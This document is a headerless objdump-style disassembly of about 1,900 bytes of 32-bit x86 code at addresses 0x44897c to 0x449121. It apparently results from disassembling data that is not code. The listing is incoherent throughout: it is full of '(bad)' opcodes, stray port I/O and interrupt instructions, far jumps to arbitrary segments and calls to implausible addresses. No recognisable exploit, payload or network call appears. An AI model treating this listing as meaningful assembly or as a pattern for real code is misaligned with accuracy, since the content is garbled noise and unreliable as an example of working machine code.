  44897c:	ins    BYTE PTR es:[edi],dx
  44897d:	pop    ecx
  44897e:	pop    ss
  44897f:	adc    BYTE PTR [edi-0x43],al
  448982:	fcmovb st,st(0)
  448984:	mov    ecx,0x5ec27454
  448989:	outs   dx,BYTE PTR ds:[esi]
  44898a:	or     al,0xd
  44898c:	mov    bl,0xd3
  44898e:	pop    edx
  44898f:	sub    DWORD PTR [ecx-0x21ada39a],ebp
  448995:	cs test al,0xbe
  448998:	add    bl,BYTE PTR [edi-0x4]
  44899b:	ret    0xf6c
  44899e:	out    dx,al
  44899f:	fisttp DWORD PTR [edx]
  4489a1:	adc    eax,0xfa194324
  4489a6:	popa   
  4489a7:	mov    eax,ds:0x3a79b53e
  4489ac:	adc    al,0x9b
  4489ae:	rcr    BYTE PTR ss:[esi-0x50],cl
  4489b2:	inc    ecx
  4489b3:	imul   edi,DWORD PTR [eax+0x28461cc1],0x75
  4489ba:	outs   dx,BYTE PTR ds:[esi]
  4489bb:	jg     0x4489df
  4489bd:	popa   
  4489be:	add    al,0xc5
  4489c0:	(bad)
  4489c3:	jmp    0x448a20
  4489c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4489c6:	das    
  4489c7:	mov    al,cl
  4489c9:	sbb    edx,DWORD PTR [edi+0x79]
  4489cc:	cs (bad) 
  4489ce:	jne    0x448a05
  4489d0:	int3   
  4489d1:	pusha  
  4489d2:	scas   eax,DWORD PTR es:[edi]
  4489d3:	enter  0x1da7,0x8
  4489d7:	add    al,0x6d
  4489d9:	call   0x8a8f0ec7
  4489de:	pop    edi
  4489df:	push   es
  4489e0:	sahf   
  4489e1:	sub    ebx,esp
  4489e3:	add    DWORD PTR [edi+0x70555660],edx
  4489e9:	pop    ds
  4489ea:	cwde   
  4489eb:	adc    DWORD PTR [edx+ebp*8],esi
  4489ee:	add    al,BYTE PTR [esi+0x26]
  4489f1:	test   eax,0xca9c1a2e
  4489f6:	pushf  
  4489f7:	jmp    0x3fa3e45c
  4489fc:	push   esi
  4489fd:	inc    ebx
  4489fe:	fst    QWORD PTR [eax]
  448a00:	push   ds
  448a01:	out    0x46,al
  448a03:	call   0x22af1766
  448a08:	enter  0x6352,0x7a
  448a0c:	lea    esp,[eax+0x57]
  448a0f:	mov    edx,0xa73c725
  448a14:	adc    edx,DWORD PTR [edx+0x0]
  448a17:	adc    DWORD PTR [edx],ebp
  448a19:	jb     0x4489cf
  448a1b:	xchg   ebp,eax
  448a1c:	push   ss
  448a1d:	xchg   edx,eax
  448a1e:	and    al,0x9f
  448a20:	shl    BYTE PTR [eax],1
  448a22:	mov    es,WORD PTR [ecx+0x367175d]
  448a28:	inc    ebp
  448a29:	popa   
  448a2a:	xchg   BYTE PTR [ebx+0x3377850f],dh
  448a30:	ja     0x448a27
  448a32:	out    dx,al
  448a33:	xor    eax,DWORD PTR [edi+eax*8+0x66d0e0eb]
  448a3a:	js     0x4489dd
  448a3c:	out    dx,al
  448a3d:	dec    esi
  448a3e:	or     BYTE PTR [ebx],ah
  448a40:	(bad)  
  448a41:	or     al,0xab
  448a43:	hlt    
  448a44:	pop    esi
  448a45:	dec    ecx
  448a46:	int    0x9d
  448a48:	sub    BYTE PTR [edi],dh
  448a4a:	mov    bl,0x75
  448a4c:	xor    edx,DWORD PTR [edx+0x1a]
  448a4f:	ret    0x75bb
  448a52:	outs   dx,BYTE PTR ds:[esi]
  448a53:	fidivr DWORD PTR [esi]
  448a55:	ror    DWORD PTR [edx-0x65],1
  448a58:	pop    esi
  448a59:	rcl    DWORD PTR [eax+edx*4],cl
  448a5c:	adc    bh,BYTE PTR [esi+0x5627f56f]
  448a62:	pop    ss
  448a63:	jmp    0x1bb33cdd
  448a68:	ins    BYTE PTR es:[edi],dx
  448a69:	retf   
  448a6a:	test   al,0x70
  448a6c:	pop    esi
  448a6d:	jmp    DWORD PTR [esi+0x7bed0e67]
  448a73:	cmp    BYTE PTR [edx+0x61],al
  448a76:	add    BYTE PTR [edi-0x14507497],0x46
  448a7d:	shr    esi,0x97
  448a80:	out    0xb3,al
  448a82:	in     al,0x89
  448a84:	lods   eax,DWORD PTR ds:[esi]
  448a85:	xchg   ebx,eax
  448a86:	cs (bad) 
  448a88:	push   edx
  448a89:	and    edx,DWORD PTR [eax+ebp*2+0x317aed66]
  448a90:	imul   ebp,DWORD PTR [eax],0x85e2aaf
  448a96:	cli    
  448a97:	rol    dh,0x93
  448a9a:	mov    dh,0x23
  448a9c:	sub    DWORD PTR [esi-0x549d5ead],0x42bcda1e
  448aa6:	dec    edx
  448aa7:	in     al,dx
  448aa8:	pop    esi
  448aa9:	mov    edi,0x8463a5a3
  448aae:	push   0xe5840f0
  448ab3:	bound  edi,QWORD PTR [eax+eax*8-0x15]
  448ab7:	stos   DWORD PTR es:[edi],eax
  448ab8:	daa    
  448ab9:	jbe    0x448a61
  448abb:	cmp    al,0x64
  448abd:	jp     0x448aa0
  448abf:	jnp    0x448af8
  448ac1:	xchg   edi,eax
  448ac2:	and    BYTE PTR [ecx+0x462a1349],ah
  448ac8:	(bad)  
  448aca:	call   0xfed897
  448acf:	adc    al,0x14
  448ad1:	popa   
  448ad2:	aas    
  448ad3:	aas    
  448ad4:	inc    edi
  448ad5:	sub    al,0xd1
  448ad7:	mov    dh,BYTE PTR [esi+0x60c9eec8]
  448add:	rcr    ah,cl
  448adf:	dec    eax
  448ae0:	xchg   ebp,eax
  448ae1:	adc    edx,DWORD PTR [edx]
  448ae3:	mov    eax,ds:0x8dabb3ef
  448ae8:	add    DWORD PTR [edi+0x6f5ebc37],ebx
  448aee:	xor    dl,bl
  448af0:	and    BYTE PTR [eax],0x9f
  448af3:	fwait
  448af4:	daa    
  448af5:	sub    BYTE PTR [ecx+eiz*4+0x55fdf1e2],cl
  448afc:	push   ss
  448afd:	xor    eax,0xad5e140d
  448b02:	(bad)  
  448b03:	test   DWORD PTR [esi],esp
  448b05:	mov    edx,0x60d3411e
  448b0a:	in     eax,0x4
  448b0c:	in     al,0xb5
  448b0e:	sub    bh,BYTE PTR [ebp+0x1ee07b9]
  448b14:	outs   dx,BYTE PTR ds:[esi]
  448b15:	pop    eax
  448b16:	push   eax
  448b17:	out    dx,eax
  448b18:	call   0xcfed95f4
  448b1d:	push   esi
  448b1e:	outs   dx,BYTE PTR ds:[esi]
  448b1f:	mov    ?,esp
  448b21:	repz dec ebx
  448b23:	lahf   
  448b24:	cs pop edx
  448b26:	in     al,dx
  448b27:	jp     0x448adc
  448b29:	in     eax,0xdc
  448b2b:	sub    BYTE PTR [edi],0xe1
  448b2e:	inc    ebp
  448b2f:	dec    esp
  448b30:	es retf 0xa0b3
  448b34:	mov    ds:0x11d538d7,al
  448b39:	pop    esp
  448b3a:	inc    eax
  448b3b:	mov    DWORD PTR [esi-0x79],ebx
  448b3e:	xchg   ebp,eax
  448b3f:	adc    DWORD PTR [ebx],ebp
  448b41:	fadd   QWORD PTR [ebp+0x3e6007c8]
  448b47:	pusha  
  448b48:	inc    ecx
  448b49:	es popa 
  448b4b:	sbb    ecx,edx
  448b4d:	mov    eax,0x885e37d5
  448b52:	lock dec eax
  448b54:	(bad)  
  448b55:	jmp    0x448b1c
  448b57:	lock pop es
  448b59:	pusha  
  448b5a:	sub    bx,0xffc8
  448b5e:	pop    edi
  448b5f:	enter  0x80b2,0xca
  448b63:	stc    
  448b64:	arpl   ax,cx
  448b66:	push   edx
  448b67:	int    0xba
  448b69:	add    BYTE PTR [esi+0x32],0x6e
  448b6d:	fistp  QWORD PTR [eax-0x5f]
  448b70:	popa   
  448b71:	cs out 0x33,al
  448b74:	pop    esp
  448b75:	mov    esi,0x103c59be
  448b7a:	mov    dh,BYTE PTR [edi-0x21011aa5]
  448b80:	push   ebx
  448b81:	rcl    DWORD PTR [edx+0x3e],0xa7
  448b85:	push   ss
  448b86:	ja     0x448b29
  448b88:	sub    DWORD PTR [edi],eax
  448b8a:	retf   
  448b8b:	mov    eax,0xa7a81a44
  448b90:	pop    esi
  448b91:	dec    eax
  448b92:	stos   DWORD PTR es:[edi],eax
  448b93:	sahf   
  448b94:	cld    
  448b95:	inc    esi
  448b96:	neg    bl
  448b98:	xor    esp,DWORD PTR [ecx+0x78]
  448b9b:	(bad)  
  448b9c:	icebp  
  448b9d:	jl     0x448bad
  448b9f:	(bad)  
  448ba0:	sub    eax,0xc7e2ee6e
  448ba5:	push   eax
  448ba6:	in     al,0x97
  448ba8:	add    DWORD PTR [edi-0x7e],0xffffffa1
  448bac:	push   cs
  448bad:	sbb    al,0xae
  448baf:	mov    ebx,0xf09959fc
  448bb4:	pop    ebp
  448bb5:	jns    0x448b94
  448bb7:	cmp    BYTE PTR [ebp-0x31],dh
  448bba:	pop    ds
  448bbb:	js     0x448c2f
  448bbd:	or     al,0xbf
  448bbf:	lods   eax,DWORD PTR ds:[esi]
  448bc0:	daa    
  448bc1:	in     al,0x6e
  448bc3:	cmp    ah,al
  448bc5:	push   es
  448bc6:	inc    edi
  448bc7:	pusha  
  448bc8:	mov    ecx,0xb31ee2d
  448bcd:	test   al,0xfc
  448bcf:	pop    ebp
  448bd0:	int3   
  448bd1:	pop    edi
  448bd2:	push   ebp
  448bd3:	mov    al,ds:0x18bc132b
  448bd8:	(bad)  
  448bd9:	adc    eax,0xe36e7ed3
  448bde:	out    0xcc,al
  448be0:	pop    esi
  448be1:	inc    esi
  448be2:	mov    gs,WORD PTR [edx+0x3ef94a0a]
  448be8:	inc    ebp
  448be9:	popa   
  448bea:	(bad)  
  448beb:	push   esi
  448bec:	jmp    DWORD PTR [ecx+0x6a]
  448bef:	loopne 0x448b9d
  448bf1:	mov    ebx,0x1a2271ee
  448bf6:	mov    esi,0x8536621e
  448bfb:	sub    DWORD PTR [edi+0x60],eax
  448bfe:	cld    
  448bff:	jnp    0x448c55
  448c01:	test   al,0x82
  448c03:	stos   BYTE PTR es:[edi],al
  448c04:	out    dx,eax
  448c05:	sub    BYTE PTR [ecx-0x4a809ad1],0x91
  448c0c:	clc    
  448c0d:	pusha  
  448c0e:	adc    DWORD PTR [edx],esp
  448c10:	fldcw  WORD PTR [edx+0x60b43161]
  448c16:	push   0x59
  448c18:	xchg   DWORD PTR [ebx],esp
  448c1a:	dec    edi
  448c1b:	adc    al,0x72
  448c1d:	int3   
  448c1e:	out    dx,al
  448c1f:	shl    BYTE PTR [edi+0x3],1
  448c22:	mov    edi,0x406e48b2
  448c27:	jmp    0xa359:0x298360a7
  448c2e:	xchg   ebx,ebp
  448c30:	mov    al,0x19
  448c32:	dec    eax
  448c33:	(bad)  
  448c34:	pop    ecx
  448c35:	dec    ecx
  448c36:	mov    al,0x8f
  448c38:	xchg   esp,eax
  448c39:	scas   eax,DWORD PTR es:[edi]
  448c3a:	ins    BYTE PTR es:[edi],dx
  448c3b:	cdq    
  448c3c:	int    0xab
  448c3e:	cs push ebp
  448c40:	out    0xae,eax
  448c42:	add    BYTE PTR [ecx],ah
  448c44:	in     al,0xbf
  448c46:	mov    eax,es:0xf1f7ceb1
  448c4c:	sbb    DWORD PTR [ebx-0x54],ecx
  448c4f:	mov    al,ds:0x4cf1465c
  448c54:	adc    BYTE PTR [eax-0x58],al
  448c57:	and    bl,BYTE PTR [esi+0x4e]
  448c5a:	pushf  
  448c5b:	xchg   ecx,eax
  448c5c:	and    ebx,esp
  448c5e:	enter  0xadf9,0x60
  448c62:	daa    
  448c63:	jecxz  0x448bff
  448c65:	in     eax,dx
  448c66:	shl    BYTE PTR [ecx+0x75eecb17],cl
  448c6c:	ins    DWORD PTR es:[edi],dx
  448c6d:	popf   
  448c6e:	mov    ds:0xbdcfe452,al
  448c73:	mov    ds:0x436e3cc2,eax
  448c78:	jp     0x448ca7
  448c7a:	inc    esi
  448c7b:	mov    ebx,0xabd9433e
  448c80:	xor    DWORD PTR ds:0x6a8920f4,edx
  448c86:	sbb    al,0xec
  448c88:	cmp    bh,ah
  448c8a:	pop    eax
  448c8b:	jge    0x448c23
  448c8d:	pusha  
  448c8e:	outs   dx,BYTE PTR ds:[esi]
  448c8f:	xor    bh,BYTE PTR [ebx]
  448c91:	out    dx,eax
  448c92:	jmp    0x7872:0xa6698f7b
  448c99:	dec    ebx
  448c9a:	out    dx,al
  448c9b:	(bad)  
  448c9c:	ds ins BYTE PTR es:[edi],dx
  448c9e:	imul   edx,DWORD PTR [ebx-0x5f148f33],0xffffffa4
  448ca5:	test   DWORD PTR ds:0xfa49c3df,esp
  448cab:	nop
  448cac:	pop    esi
  448cad:	into   
  448cae:	xchg   ecx,edx
  448cb0:	xor    BYTE PTR [esi-0x8],dl
  448cb3:	cli    
  448cb4:	mov    bh,0x60
  448cb6:	pop    edi
  448cb7:	in     al,dx
  448cb8:	inc    ebp
  448cb9:	fdiv   st(3),st
  448cbb:	(bad)  
  448cbc:	js     0x448d11
  448cbe:	out    dx,al
  448cbf:	adc    al,0x3a
  448cc1:	xchg   ecx,eax
  448cc2:	mov    esp,0xbd203d64
  448cc7:	mov    al,ds:0xdc27c9d6
  448ccc:	ss lahf 
  448cce:	loop   0x448c7a
  448cd0:	pop    ebp
  448cd1:	pop    edi
  448cd2:	xor    ebp,edx
  448cd4:	sub    al,0xf8
  448cd6:	pop    ebp
  448cd7:	mov    edx,0x5c2e9b77
  448cdc:	dec    ebp
  448cdd:	mov    cl,0x74
  448cdf:	mov    eax,ds:0x1539e83c
  448ce4:	sbb    BYTE PTR [edi],0x6b
  448ce7:	getsec 
  448ce9:	jmp    DWORD PTR ss:[ecx]
  448cec:	repz pop eax
  448cee:	adc    dh,bl
  448cf0:	popf   
  448cf1:	neg    DWORD PTR [esi+0x34]
  448cf4:	mov    ebx,0xfaf34c52
  448cf9:	sub    al,0xc9
  448cfb:	jae    0x448d72
  448cfd:	mov    al,ds:0x38a17588
  448d02:	out    dx,al
  448d03:	lods   al,BYTE PTR ds:[esi]
  448d04:	adc    eax,0xa60dcca3
  448d09:	dec    eax
  448d0a:	ins    DWORD PTR es:[edi],dx
  448d0b:	mov    eax,ds:0x868f2968
  448d10:	popa   
  448d11:	lods   eax,DWORD PTR ds:[esi]
  448d12:	sub    al,0xfd
  448d14:	xor    edx,DWORD PTR [edx]
  448d16:	stos   DWORD PTR es:[edi],eax
  448d17:	mov    eax,ds:0xa91dfe25
  448d1c:	mov    ebp,ecx
  448d1e:	data16 jae 0x448cd6
  448d21:	pusha  
  448d22:	and    dl,BYTE PTR [edi+0x12]
  448d25:	jnp    0x448da5
  448d27:	pop    eax
  448d28:	jmp    0x4aa3:0x2891eefb
  448d2f:	mov    ebp,0xa7d02ae1
  448d34:	loop   0x448cdf
  448d36:	mov    eax,0xe424abd
  448d3b:	mov    DWORD PTR [ecx],ecx
  448d3d:	push   ds
  448d3e:	xor    ch,BYTE PTR [ebx]
  448d40:	pop    edi
  448d41:	int    0xa8
  448d43:	lock lock mov edi,0xf0b370df
  448d4a:	inc    eax
  448d4b:	mov    eax,ds:0xa3e7992c
  448d50:	imul   esi,ecx,0xffffffff
  448d53:	mov    esp,0x2eeee9b6
  448d58:	mov    cl,0x21
  448d5a:	leave  
  448d5b:	fiadd  DWORD PTR [ebp+0x40]
  448d5e:	sbb    esp,DWORD PTR [ecx-0x5b5c062f]
  448d64:	adc    BYTE PTR [edi+edi*4-0x57],ch
  448d68:	(bad)  
  448d69:	and    eax,0xcb50ee
  448d6e:	fld    st(2)
  448d70:	or     eax,0xaaa18ae8
  448d75:	xchg   edi,edx
  448d77:	(bad)  
  448d78:	and    ah,al
  448d7a:	dec    ebp
  448d7b:	jbe    0x448ddc
  448d7d:	ins    BYTE PTR es:[edi],dx
  448d7e:	xchg   ebx,eax
  448d7f:	xchg   edx,eax
  448d80:	loop   0x448df8
  448d82:	leave  
  448d83:	js     0x448d6f
  448d85:	fst    DWORD PTR [esi-0x2ea99b72]
  448d8b:	mov    WORD PTR [edi],cs
  448d8d:	and    DWORD PTR [ebx],ecx
  448d8f:	shl    BYTE PTR [esi],0x24
  448d92:	repnz retf 0xf05e
  448d96:	jmp    0x8f87:0x9286dac9
  448d9d:	pusha  
  448d9e:	int    0xa
  448da0:	sub    cl,BYTE PTR [ebx-0x4ec45b72]
  448da6:	out    dx,al
  448da7:	xor    BYTE PTR [edx+0x2f],dl
  448daa:	out    0x9d,eax
  448dac:	clc    
  448dad:	mov    eax,ds:0xbb1ea14c
  448db2:	xor    esp,DWORD PTR [ebx-0x1bc28fce]
  448db8:	pop    esi
  448db9:	ins    DWORD PTR es:[edi],dx
  448dba:	cmp    al,0x0
  448dbc:	jns    0x448e20
  448dbe:	outs   dx,BYTE PTR ds:[esi]
  448dbf:	arpl   WORD PTR [ebp+0x42],dx
  448dc2:	dec    esp
  448dc3:	jae    0x448e1b
  448dc5:	and    dh,bl
  448dc7:	aam    0x73
  448dc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448dca:	inc    esi
  448dcb:	add    DWORD PTR [esi+0x3831ce35],ebp
  448dd1:	stos   BYTE PTR es:[edi],al
  448dd2:	outs   dx,BYTE PTR ds:[esi]
  448dd3:	pop    ebx
  448dd4:	xchg   eax,ecx
  448dd6:	or     DWORD PTR [eax+0x4c0da0c6],ebp
  448ddc:	and    BYTE PTR [ecx+0x7277b697],ah
  448de2:	out    0x31,eax
  448de4:	jno    0x448e38
  448de6:	ss and al,0x3e
  448de9:	or     al,0x2f
  448deb:	outs   dx,DWORD PTR ds:[esi]
  448dec:	jmp    0x8146c06d
  448df1:	pusha  
  448df2:	sbb    ebx,DWORD PTR [ecx]
  448df4:	sar    DWORD PTR [ecx+0x175dc9c1],1
  448dfa:	or     al,ah
  448dfc:	and    esi,DWORD PTR ss:[ebp-0x63]
  448e00:	fild   QWORD PTR [esi]
  448e02:	pop    eax
  448e03:	pop    ds
  448e04:	sub    al,0x96
  448e06:	inc    edi
  448e07:	ret    
  448e08:	(bad)  [edi+edx*8+0x0]
  448e0c:	jae    0x448e05
  448e0e:	test   BYTE PTR [ebp-0x1a7a9eb6],al
  448e14:	call   0x15b819ee
  448e19:	cmp    esi,ebp
  448e1b:	mov    cl,bl
  448e1d:	mov    fs,WORD PTR [edi+0x77]
  448e20:	or     BYTE PTR [edi+0x6e46a171],ah
  448e26:	stos   DWORD PTR es:[edi],eax
  448e27:	lods   eax,DWORD PTR ds:[esi]
  448e28:	cmp    ecx,DWORD PTR [esi]
  448e2a:	mov    DWORD PTR [esi+0x6c12c5e],0x64526eda
  448e34:	sahf   
  448e35:	and    al,ch
  448e37:	mov    eax,ds:0x9c2fe7b0
  448e3c:	or     dh,BYTE PTR [edi+0x194b7515]
  448e42:	dec    esi
  448e43:	xchg   edx,eax
  448e44:	pop    ebx
  448e45:	or     DWORD PTR [eax],ecx
  448e47:	xchg   al,al
  448e49:	aaa    
  448e4a:	outs   dx,BYTE PTR ds:[esi]
  448e4b:	pop    ebx
  448e4c:	mov    al,0x9d
  448e4e:	and    ah,BYTE PTR [ecx+0x61c17d80]
  448e54:	jo     0x448e99
  448e56:	mov    esp,0xc48c785f
  448e5b:	(bad)  
  448e5c:	fstp   DWORD PTR [esi+0x6e]
  448e5f:	add    eax,0xa0ab572a
  448e64:	adc    DWORD PTR [ebx],ebp
  448e66:	mov    eax,0xa0720235
  448e6b:	jbe    0x448ecb
  448e6d:	inc    ebx
  448e6e:	cld    
  448e6f:	fdivr  st(0),st
  448e71:	scas   eax,DWORD PTR es:[edi]
  448e72:	cli    
  448e73:	gs mov ecx,0xbcf61460
  448e79:	not    BYTE PTR [edx-0x30]
  448e7c:	sub    al,0x58
  448e7e:	ret    0x138e
  448e81:	popa   
  448e82:	xchg   edi,eax
  448e83:	hlt    
  448e84:	jnp    0x448e1d
  448e86:	test   al,0x1a
  448e88:	add    ah,BYTE PTR [eax+0x1f]
  448e8b:	jmp    0xfc051c88
  448e90:	adc    DWORD PTR [ecx+0x10eede6b],edx
  448e96:	out    dx,al
  448e97:	add    bl,0x4a
  448e9a:	call   0xd4a1:0x58dc72e2
  448ea1:	stos   DWORD PTR es:[edi],eax
  448ea2:	cwde   
  448ea3:	pop    eax
  448ea4:	stos   DWORD PTR es:[edi],eax
  448ea5:	cmp    DWORD PTR [ebx],eax
  448ea7:	xor    bl,BYTE PTR [esi-0x7f]
  448eaa:	(bad)  
  448eab:	lods   al,BYTE PTR ds:[esi]
  448eac:	cwde   
  448ead:	imul   ebx,DWORD PTR [ebx-0x29ec6d4],0xffffffdc
  448eb4:	das    
  448eb5:	fdivr  QWORD PTR [edi+0x2d]
  448eb8:	inc    esp
  448eb9:	mov    ds,WORD PTR [esi-0x2e]
  448ebc:	pop    esi
  448ebd:	fsubr  DWORD PTR [ebp+ebp*4-0x420fcc11]
  448ec4:	retf   0x1955
  448ec7:	inc    ebx
  448ec8:	jne    0x448f15
  448eca:	outs   dx,BYTE PTR ds:[esi]
  448ecb:	and    DWORD PTR [ebx-0x4a],0x30
  448ecf:	cmp    ebx,DWORD PTR [esi+0x3]
  448ed2:	sub    BYTE PTR [edx],0xd7
  448ed5:	adc    eax,0x6098142b
  448eda:	sub    bl,BYTE PTR [edi]
  448edc:	fs in  eax,0xda
  448edf:	inc    ebx
  448ee0:	scas   al,BYTE PTR es:[edi]
  448ee1:	aaa    
  448ee2:	adc    BYTE PTR [eax-0x5b11ec3f],dl
  448ee8:	test   DWORD PTR [ebx-0x29],esp
  448eeb:	pusha  
  448eec:	sub    eax,0x529f4061
  448ef1:	adc    DWORD PTR [edi],eax
  448ef3:	gs mov al,0xe4
  448ef6:	in     eax,dx
  448ef7:	and    ch,BYTE PTR [edi]
  448ef9:	jle    0x448ed3
  448efb:	imul   eax,DWORD PTR [ebp+0x8],0x527dfe4a
  448f02:	jae    0x448e94
  448f04:	loop   0x448e87
  448f06:	mov    edi,0x5b6560
  448f0b:	mov    cl,0xb8
  448f0d:	push   ss
  448f0e:	es icebp 
  448f10:	adc    al,0x61
  448f12:	adc    eax,0x37c3c1aa
  448f17:	sar    BYTE PTR [ebp+0x2d],1
  448f1a:	mov    eax,0x6959ad6e
  448f1f:	sub    eax,0xb0c53ecd
  448f24:	fld    QWORD PTR [ebp-0x25ed4f8c]
  448f2a:	xchg   DWORD PTR [ecx+0x4ebdbe08],esp
  448f30:	retf   0x911
  448f33:	lock cmp eax,0x5ab13f61
  448f39:	dec    ebp
  448f3a:	into   
  448f3b:	in     eax,0x33
  448f3d:	xor    eax,0x127262ea
  448f42:	mov    edx,0x2e03de90
  448f47:	test   DWORD PTR [esi+0x51],edi
  448f4a:	jno    0x448f66
  448f4c:	pop    ebp
  448f4d:	jle    0x448fbd
  448f4f:	cmc    
  448f50:	push   edx
  448f51:	sahf   
  448f52:	test   al,0xfa
  448f54:	pop    esi
  448f55:	jns    0x448f77
  448f57:	cmp    al,0xc5
  448f59:	mov    ds:0x5778651b,al
  448f5e:	ins    BYTE PTR es:[edi],dx
  448f5f:	dec    edx
  448f60:	nop
  448f61:	and    BYTE PTR [ecx+0x28],0x5e
  448f65:	ret    
  448f66:	pop    ebx
  448f67:	dec    edi
  448f68:	inc    ebx
  448f69:	test   eax,0xb0b91802
  448f6e:	test   eax,0x646ca5a0
  448f73:	(bad)  
  448f74:	and    dl,0x3
  448f77:	leave  
  448f78:	pop    esi
  448f79:	test   edx,ebp
  448f7b:	sub    BYTE PTR [ebx+0x4ec1d8c1],cl
  448f81:	popa   
  448f82:	mov    cs,WORD PTR [ebx]
  448f84:	inc    esp
  448f85:	into   
  448f86:	aad    0xee
  448f88:	arpl   WORD PTR [edx-0x67f87eb5],di
  448f8e:	out    dx,al
  448f8f:	jbe    0x448f33
  448f91:	add    ah,BYTE PTR [edx*4-0x5ec1ce30]
  448f98:	daa    
  448f99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448f9a:	mov    ecx,0x308859f8
  448f9f:	shl    DWORD PTR [edx],1
  448fa1:	stos   BYTE PTR es:[edi],al
  448fa2:	or     al,0xbd
  448fa4:	fnop   
  448fa6:	in     eax,dx
  448fa7:	jno    0x448f7e
  448fa9:	jmp    0x448fc5
  448fab:	mov    ds:0xc4d4709a,al
  448fb0:	push   edx
  448fb1:	ins    BYTE PTR es:[edi],dx
  448fb2:	pusha  
  448fb3:	mov    eax,ds:0xd1d97b04
  448fb8:	scas   al,BYTE PTR es:[edi]
  448fb9:	shr    dh,0x73
  448fbc:	pop    ebx
  448fbd:	jl     0x448fee
  448fbf:	stos   DWORD PTR es:[edi],eax
  448fc0:	(bad)  
  448fc1:	mov    cs,WORD PTR [esi-0x6dc78b5f]
  448fc7:	jge    0x449004
  448fc9:	adc    al,0x49
  448fcb:	mov    bl,0x5e
  448fcd:	or     BYTE PTR [edi],dl
  448fcf:	hlt    
  448fd0:	and    BYTE PTR [esi+0x14],bh
  448fd3:	shl    BYTE PTR [ecx+0x59],cl
  448fd6:	rcl    BYTE PTR [ecx-0x2c],1
  448fd9:	xchg   ebx,eax
  448fda:	mul    dl
  448fdc:	cmp    bh,BYTE PTR [ecx-0x52]
  448fdf:	push   eax
  448fe0:	pop    eax
  448fe1:	scas   eax,DWORD PTR es:[edi]
  448fe2:	out    dx,al
  448fe3:	push   edi
  448fe4:	and    BYTE PTR [esi+0x4a8aab3f],0xf2
  448feb:	int3   
  448fec:	pop    esp
  448fed:	dec    edx
  448fee:	in     al,0xa0
  448ff0:	mov    ebx,0x75f9d192
  448ff5:	lods   eax,DWORD PTR ds:[esi]
  448ff6:	shl    DWORD PTR ds:0x217de737,0x69
  448ffd:	or     al,0x6d
  448fff:	call   0xa8586968
  449004:	mov    al,ds:0x89ee8e7b
  449009:	xor    BYTE PTR [eax],ah
  44900b:	int3   
  44900c:	jmp    0x2692:0x2fb6eedc
  449013:	mov    esi,0x87751bee
  449018:	test   BYTE PTR [eax-0x4b],ah
  44901b:	ss nop
  44901d:	fild   WORD PTR [eax-0x6b]
  449020:	lock xor eax,0xb39203ee
  449026:	aas    
  449027:	test   BYTE PTR [eax+0x3c],al
  44902a:	adc    al,0x87
  44902c:	lahf   
  44902d:	fs push es
  44902f:	loope  0x44908f
  449031:	shr    BYTE PTR [edi-0x26497ccd],1
  449037:	xor    BYTE PTR [esi-0x7],bl
  44903a:	pop    edi
  44903b:	out    0x45,eax
  44903d:	or     al,0x30
  44903f:	adc    DWORD PTR [ecx],ebp
  449041:	jns    0x448fc5
  449043:	adc    al,0xd9
  449045:	pusha  
  449046:	lods   al,BYTE PTR ds:[esi]
  449047:	pop    ss
  449048:	cld    
  449049:	mov    esp,0x6afe3803
  44904e:	out    dx,al
  44904f:	in     eax,0xf1
  449051:	mov    BYTE PTR [edx],0x61
  449054:	frstor [edx+ebp*1-0xc]
  449058:	ficomp DWORD PTR [ebp-0xc]
  44905b:	fisttp QWORD PTR [esi-0x30]
  44905e:	xor    bl,BYTE PTR [ecx-0x2a]
  449061:	mov    ah,0x47
  449063:	test   BYTE PTR [esi+0x2d],bl
  449066:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449067:	not    BYTE PTR [ebx+0x1993b25c]
  44906d:	popa   
  44906e:	inc    eax
  44906f:	retf   0xdec
  449072:	xchg   edi,eax
  449073:	ins    BYTE PTR es:[edi],dx
  449074:	mov    al,ds:0x5efc86c0
  449079:	pop    eax
  44907a:	hlt    
  44907b:	and    BYTE PTR [edi],dh
  44907d:	rcr    BYTE PTR ds:0xa4608e92,0xb0
  449084:	mov    ebp,0xb2c27269
  449089:	push   esp
  44908a:	fiadd  WORD PTR [edi+0x126ce25e]
  449090:	add    edx,DWORD PTR [edi+0x450995e6]
  449096:	sub    al,0x7c
  449098:	jo     0x4490dc
  44909a:	sub    BYTE PTR [ecx],ah
  44909c:	das    
  44909d:	inc    BYTE PTR [ecx+0x3b]
  4490a0:	(bad)  
  4490a2:	out    dx,al
  4490a3:	sub    al,0x65
  4490a5:	into   
  4490a6:	mov    edx,0xa7d36755
  4490ab:	mov    al,ds:0xec38ccc1
  4490b0:	add    bh,BYTE PTR [ebx]
  4490b2:	test   esi,eax
  4490b4:	push   ebx
  4490b5:	fld    TBYTE PTR [eax*1+0x7436301d]
  4490bc:	pop    ds
  4490bd:	inc    esi
  4490be:	cmp    DWORD PTR [esi],ebp
  4490c0:	jb     0x449102
  4490c2:	fisub  WORD PTR [eax-0x3fc5f247]
  4490c8:	hlt    
  4490c9:	(bad)  
  4490ca:	stc    
  4490cb:	sbb    eax,0xda7f7b5e
  4490d0:	out    0xaa,al
  4490d2:	outs   dx,BYTE PTR ds:[esi]
  4490d3:	push   esp
  4490d4:	cli    
  4490d5:	pusha  
  4490d6:	xchg   edx,eax
  4490d7:	pop    esp
  4490d8:	sbb    eax,0xd15094c9
  4490dd:	mov    ch,0xeb
  4490df:	xchg   ebx,eax
  4490e0:	cmc    
  4490e1:	xor    DWORD PTR [ebp+0x33],esp
  4490e4:	aam    0xc0
  4490e6:	loop   0x449108
  4490e8:	inc    eax
  4490e9:	popa   
  4490ea:	pop    ebx
  4490eb:	das    
  4490ec:	and    WORD PTR [eax-0xf19433d],bp
  4490f3:	icebp  
  4490f4:	imul   esi,DWORD PTR [ebx+0x70c75ae1]
  4490fb:	arpl   WORD PTR [esi+0x55],si
  4490fe:	add    DWORD PTR [ecx+0x716bf51f],esp
  449104:	mov    fs,ebx
  449106:	mov    dh,BYTE PTR [eax+0x5e]
  449109:	jl     0x4490e5
  44910b:	dec    ebp
  44910c:	test   eax,0x723aed68
  449111:	inc    esp
  449112:	or     BYTE PTR [eax],al
  449114:	out    dx,eax
  449115:	pop    ecx
  449116:	sbb    BYTE PTR [edi+ecx*2-0x7af67a7f],al
  44911d:	das    
  44911e:	out    dx,al
  44911f:	xchg   BYTE PTR [esi],dh
  449121:	pop    edi
